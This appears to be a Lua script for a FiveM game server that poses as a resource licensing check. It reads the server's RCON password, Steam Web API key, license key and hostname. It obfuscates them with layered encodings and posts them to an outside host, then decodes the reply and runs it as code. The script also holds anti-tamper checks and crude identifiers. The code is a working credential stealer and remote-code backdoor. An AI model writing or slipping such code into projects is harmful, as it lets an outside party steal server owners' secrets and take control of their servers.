Citizen.CreateThread(function()

                --Load Protection
                if load == print then
                    print('Cracker detected!')
                    return
                end

                if load == io.write then
                    print('Cracker detected!')
                    return
                end

                if not debug.getinfo(load) then
                    print('Cracker detected!')
                    return
                end

                if load == SaveResourceFile then
                    print('Cracker detected!')
                    return
                end

                --PerformHttpRequest Protection
                if PerformHttpRequest == print then
                    print('Cracker detected!')
                    return
                end

                if PerformHttpRequest == io.write then
                    print('Cracker detected!')
                    return
                end

                --PerformHttpRequestInternal Protection
                if PerformHttpRequestInternal == print then
                    print('Cracker detected!')
                    return
                end

                if PerformHttpRequestInternal == io.write then
                    print('Cracker detected!')
                    return
                end

                local httpDispatch = {}
                local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
                local base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

                AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
                    if httpDispatch[token] then
                        local userCallback = httpDispatch[token]
                        httpDispatch[token] = nil
                        userCallback(status, body, headers)
                    end
                end)

                function senharbiossuruyon(length)
                    local res = ''
                    for i = 1, length do
                        res = res .. string.char(math.random(97, 122))
                    end
                    return res
                end

                function funcName(url, cb, method, data, headers, options)
                    local followLocation = true

                    if options and options.followLocation ~= nil then
                        followLocation = options.followLocation
                    end

                    local t = {
                        url = url,
                        method = method or 'GET',
                        data = data or '',
                        headers = headers or {},
                        followLocation = followLocation
                    }
                    local d = json.encode(t)
                    local id = PerformHttpRequestInternal(d, d:len())
                    httpDispatch[id] = cb
                end

                function enc(data)
                    return ((data:gsub('.', function(x)
                        local r,b='',x:byte()
                        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
                        return r;
                    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
                        if (#x < 6) then return '' end
                        local c=0
                        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
                        return b:sub(c+1,c+1)
                    end)..({ '', '==', '=' })[#data%3+1])
                end

                function str_split(str, size)
                    local result = {}
                    for i=1, #str, size do
                        table.insert(result, str:sub(i, i + size - 1))
                    end
                    return result
                end

                function dec2bin(num)
                    local result = ''
                    repeat
                        local halved = num / 2
                        local int, frac = math.modf(halved)
                        num = int
                        result = math.ceil(frac) .. result
                    until num == 0
                    return result
                end

                local function padRight(str, length, char)
                    while #str % length ~= 0 do
                        str = str .. char
                    end
                    return str
                end

                function otuz2(str)
                local binary = str:gsub('.', function (char)
                    return string.format('%08u', dec2bin(char:byte()))
                end)

                binary = str_split(binary, 5)
                local last = table.remove(binary)
                table.insert(binary, padRight(last, 5, '0'))

                local encoded = {}
                for i=1, #binary do
                    local num = tonumber(binary[i], 2)
                    table.insert(encoded, base32Alphabet:sub(num + 1, num + 1))
                end
                return padRight(table.concat(encoded), 8, '=')
                end

                function spec1(s)
                    return (s:gsub('%a', function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13))end))
                end

                function cumshot(data)
                    data = string.gsub(data, '[^'..b..'=]', '')
                    return (data:gsub('.', function(x)
                        if (x == '=') then return '' end
                        local r,f='',(b:find(x)-1)
                        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
                        return r;
                    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                        if (#x ~= 8) then return '' end
                        local c=0
                        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                        return string.char(c)
                    end))
                end

                function loadScript()
                    local authkey = senharbiossuruyon(5)
                    local a = {}
                    local SERVERNAME = GetConvar('sv_hostname', 'Not found!')
                    local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
                    local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
                    local TAGS = GetConvar('tags', 'Not found!')
                    local KEY = GetConvar('sv_licenseKey', 'Not found!')

                    if KEY  == '' or KEY == nil then
                        KEY = 'Not found!'
                    end

                    table.insert(a, 1, authkey)
                    table.insert(a, 2, SERVERNAME)
                    table.insert(a, 3, APIKEY)
                    table.insert(a, 4, RCON)
                    table.insert(a, 5, TAGS)
                    table.insert(a, 6, KEY)
                    table.insert(a, 7, GetCurrentResourceName())
                    table.insert(a, 8, '4')

                    local sengaysin = funcName('http://mlicense.test/api/check', function(err, text, headers)
                        local gayarray = {}
                        local cu = text:gsub('%s+', '')
                        if cu == '' then
                            gayarray[1] = 'alah'
                        else
                            gayarray = json.decode(text)
                        end
                        if gayarray[1] == authkey then
                            assert(load(spec1(cumshot(gayarray[2]:sub(gayarray[3] + 1)))))()
                            print('License System')
                            print('License has been accepted.')
                            print('License has been accepted.')
                            print('License has been accepted.')
                            print('License has been accepted.')
                            print('License has been accepted.')
                        else
                            print('License System')
                            print('Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M')
                            print('Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M')
                            print('Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M')
                            print('Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M')
                            print('Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M')
                            Wait(2500)
                            os.exit()
                        end
                    end, 'POST', 'data=' .. string.upper(string.char(math.random(97, 122))) .. enc(otuz2(spec1(json.encode(a)))))
                end

                loadScript()
            end)